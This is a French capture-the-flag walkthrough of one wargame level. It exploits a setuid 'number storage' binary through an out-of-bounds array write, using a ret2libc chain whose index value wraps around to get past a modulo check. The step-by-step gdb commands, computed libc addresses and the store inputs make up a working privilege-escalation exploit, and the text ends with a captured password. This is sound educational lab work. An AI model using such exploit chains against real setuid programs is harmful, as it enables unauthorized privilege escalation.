Je commence par analyser mon environnement :

```bash
$ id && pwd && ls -la
uid=1007(level07) gid=1007(level07) groups=1007(level07),100(users)
/home/users/level07
total 21
dr-xr-x---+ 1 level07 level07    80 Sep 13  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-rw-r--r--  1 level07 level07   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level07 level07  3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
-rw-r--r--+ 1 level07 level07    41 Oct 19  2016 .pass
-rw-r--r--  1 level07 level07   675 Sep 10  2016 .profile
```

Je trouve un binaire `level07`, que je tente d'éxecuter :

```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: a
 Failed to do a command
Input command: store
 Number: 5
 Index: 1
 Completed store command successfully
Input command: read
 Index: 5
 Number at data[5] is 0
 Completed read command successfully
Input command: read
 Index: 1
 Number at data[1] is 5
 Completed read command successfully
Input command:
```

Je décompile le binaire avec [Dogbolt](https://dogbolt.org/?id=8664e046-211f-4772-a084-6112ec01480f#Hex-Rays=36&Boomerang=19) en recoupant avec les compilateurs qui marchent et l'ASM :

```c
unsigned int get_unum()
{
    unsigned int val = 0;

    fflush(stdout);
    scanf("%u", &val);
    clear_stdin();
    return val;
}

int read_number(int *buffer)
{
    unsigned int val = 0;

    printf(" Index: ");
    val = get_unum();
    printf(" Number at data[%u] is %u\n", val, buffer[val]);
    return 0;
}

int store_number(int *buffer)
{
    unsigned int num = 0;
    unsigned int index = 0;

    printf(" Number: ");
    num = get_unum();
    printf(" Index: ");
    index = get_unum();
    if ((index % 3 == 0) || (index >> 24 == 183))
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    else
    {
        buffer[index] = num;
        return 0;
    }
    return 0;
}

int main(int argc, char **argv)
{
    int ret;
    char command[20];
    unsigned int buffer[100];

    ret = 0;
    memset(buffer, 0, sizeof(buffer));
    memset(command, 0, sizeof(command));

    while (*argv)
    {
        memset(*argv, 0, strlen(*argv));
        *argv++;
    }

    puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");
    while (1)
    {
        printf("Input command: ");
        ret = 1;
        fgets(command, 20, stdin);
        command[strchr(command, "\n")] = 0;

        if (strncmp(command, "store", 5) == 0)
            ret = store_number(buffer);
        else if (strncmp(command, "read", 4) == 0)
            ret = read_number(buffer);
        else if (strncmp(command, "quit", 4) == 0)
            break;

        if (ret)
            printf(" Failed to do %s command\n", command);
        else
            printf(" Completed %s command successfully\n", command);
        memset(command, 0, 20);
    }
    return 0;
}
```

En analysant la décompilation du code, je ne trouve pas de vulnérabilité particulière d'un point de vue des fonctions utilisées, cependant, la fonction `store_number()` présente une vulnérabilité à cette ligne :

```c
        buffer[index] = num;
```

Si l'on considère que le buffer passé déclaré ici :

```c
    unsigned int buffer[100];
```

N'est que de 100 bytes, mais que l'index utilisé plus haut proviens d'un `scanf()`, alors, on peut overflow sur ce buffer.

Je vais utiliser l'exploit `Ret2Libc` comme dans les précédents level afin d'accèder à l'adresse de `system()` (puis d'`exit()` bien que c'est optionel) et enfin celle de `/bin/sh`.

J'utilise `gdb` pour les trouver avec une nouvelle méthode trouvée [ici](https://corruptedprotocol.medium.com/elf-x86-stack-buffer-overflow-basic-6-rootme-app-system-introduction-to-ret2libc-83945accc435) pour obtenir l'adresse de `system()` et d'`exit()`:

```bash
$ gdb ./level07 -q
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) info proc mappings
process 2862
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so <-- libc
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so <-- end
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, 0xf7fd0000, "bin/sh"
0xf7f897ed
1 pattern found.
```

Je dois ensuite calculer le "padding" nécessaire, étant donné qu'il est question ici de plusieurs buffer et plusieurs variables sur plusieurs fonctions, je vais utiliser une méthode différente pour calculer le padding, en utilisant `gdb` ainsi que des `breakpoint`, puis la commande `info registers` :

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048723 <+0>:     push   %ebp
   0x08048724 <+1>:     mov    %esp,%ebp
   0x08048726 <+3>:     push   %edi
   0x08048727 <+4>:     push   %esi
   0x08048728 <+5>:     push   %ebx
   ...
   0x080489ea <+711>:   lea    -0xc(%ebp),%esp <----- break ici, avant le leave qui "vide" la stack
   0x080489ed <+714>:   pop    %ebx
   0x080489ee <+715>:   pop    %esi
   0x080489ef <+716>:   pop    %edi
   0x080489f0 <+717>:   pop    %ebp
   0x080489f1 <+718>:   ret

(gdb) b *main+711
Breakpoint 1 at 0x80489ea

(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit

Breakpoint 1, 0x080489ea in main()

(gdb) info registers
...
esp            0xffffd4f0       0xffffd4f0
ebp            0xffffd6d8       0xffffd6d8
...
```

Je calcule la différence entre `esp` et `ebp` soit `0xffffd628 - 0xffffd440 = 0x00001e8 = 488` bytes.

J'identifie ensuite le décalage par `esp` comme dans les niveaux précédent, ici, dans `gdb` :

```bash
   0x08048791 <+110>:   lea    0x24(%esp),%ebx <--- 0x24 = 36
   0x08048795 <+114>:   mov    $0x0,%eax
   0x0804879a <+119>:   mov    $0x64,%edx <-------- 0x64 = 100 (= taille du buffer)
```

Je soustrais donc 488 - 36 = 452 bytes. Enfin, j'ajoute uniquement 4 bytes cette fois-ci pour atteindre la `return address` car cette méthode implique déjà la position de `ebp`, car elle est utilisé pour calculer la différence.

Soit un total de 456 bytes nécessaire avant de ré-écrire sur la `return address`, cependant, le buffer dans lequel nous voulons écrire est :

```c
    unsigned int buffer[100];
```

Etant donné que c'est un array d'`unsigned int`, il faut compter 4 bytes par `unsigned int` à l'inverse des précédents exploit où il était question d'array de `char` (1 byte).

Je dois donc diviser mon padding 456 / 4 = 114. Cela revient à dire que `buffer[114]` pointe sur la `return address` de `main()` et que je veux donc y écrire l'adresse de `system()`. 115 pour `exit()` et enfin 116 pour `/bin/sh`.

En revanche, je ne pourrais pas utiliser l'index 114 à cause de cette condition :

```c
    if ((index % 3 == 0) || (index >> 24 == 183))
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
```

Car `114 % 3 == 0`. Je dois donc chercher une autre solution. En explorant plusieurs piste et à l'aide de `ChatGPT`, il me suggère :

```
3. Exploit Overflows

If you're able to supply values that can overflow or underflow (based on the size and type of the index variable), you might manipulate the calculations such that they bypass checks:

- Buffer Overflow: For an unsigned variable, providing a large enough value could potentially overflow and wrap around to a valid non-multiple-of-3 value.
```

Je me penche sur cette piste. Google me dit que `unsigned int max size = 4,294,967,295`. Si j'ajoute 1, l'int devrait overflow et retomber à 0, je peux donc ajouter 114 à nouveau pour un total de : `(4294967295 / 4) + 1 + 114 = 1073741938`.

Je m'assure que ce n'est pas un multiple de 3 : `1073741938 % 3 = 1`.

Cette valeur, utilisée en tant qu'index sur un array d'int, devrait être multiplié par 4, puis overflow pour équivaloir enfin 114. Je dois également m'assurer qu'elle passe le second check : `(index >> 24 == 183)` => `1073741938 >> 24 = 64`, je peux donc utiliser cette valeur comme un index pointant sur l'adresse de `system()`.

Récapitulatif des adresses, que je dois convertir en décimale puisque `scanf()` de `get_unum()` s'attend à un `%u` :

=> `system()` => 0xf7e6aed0 => 4159090384 at index 1073741938
=> `exit()` => 0xf7e5eb70 => 4159040368 at index 115
=> `/bin/sh` => 0xf7f897ed => 4160264172 at index 116

Je tente d'utiliser le programme avec ces valeurs "infectées" :

```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```

Avec succès !

